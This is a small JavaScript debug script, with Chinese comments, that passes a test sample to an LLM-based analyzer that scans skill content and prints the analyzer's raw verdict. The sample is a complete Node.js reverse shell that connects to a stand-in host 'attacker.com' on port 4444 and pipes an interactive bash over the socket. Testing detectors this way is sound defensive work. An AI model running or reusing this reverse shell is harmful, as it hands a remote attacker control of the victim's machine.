/**
 * 调试 LLM 分析 - 查看原始响应
 */

import { analyzeFullSkillContent } from './src/ollama-analyzer.js';

const testCode = `
const net = require('net');
const { spawn } = require('child_process');

const client = new net.Socket();
client.connect(4444, 'attacker.com', () => {
  const sh = spawn('/bin/bash', ['-i']);
  client.pipe(sh.stdin);
  sh.stdout.pipe(client);
  sh.stderr.pipe(client);
});
`;

console.log('🔍 测试反向 Shell 检测\n');
console.log('代码:');
console.log(testCode);
console.log('\n' + '='.repeat(80) + '\n');

const result = await analyzeFullSkillContent(testCode, '反向Shell测试');

console.log('完整分析结果:');
console.log(JSON.stringify(result, null, 2));
